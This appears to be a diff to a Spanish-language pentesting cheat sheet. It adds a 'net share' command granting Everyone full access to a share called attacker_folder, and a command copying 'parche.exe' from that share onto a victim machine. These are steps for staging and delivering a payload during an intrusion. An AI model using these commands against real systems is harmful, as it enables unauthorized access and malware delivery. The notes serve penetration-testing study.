@@ -1653,6 +1653,19 @@ net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
 
 ![image](https://github.com/gecr07/Acordeon/assets/63270579/e46560bd-2981-4887-aa70-1d324c1ba00a)
 
+En este caso, se está otorgando permisos completos (FULL) al grupo Everyone, lo que permitirá a cualquier usuario acceder al recurso compartido sin necesidad de autenticación.
+
+```
+net share attacker_folder=C:\Windows\Temp /GRANT:Everyone,FULL
+```
+Copiar desde una computadora victima archivos...
+
+```
+
+copy \\share\attacker_folder\parche.exe parche.exe
+
+```
+
 > https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters
 
 ## Crackmapexec
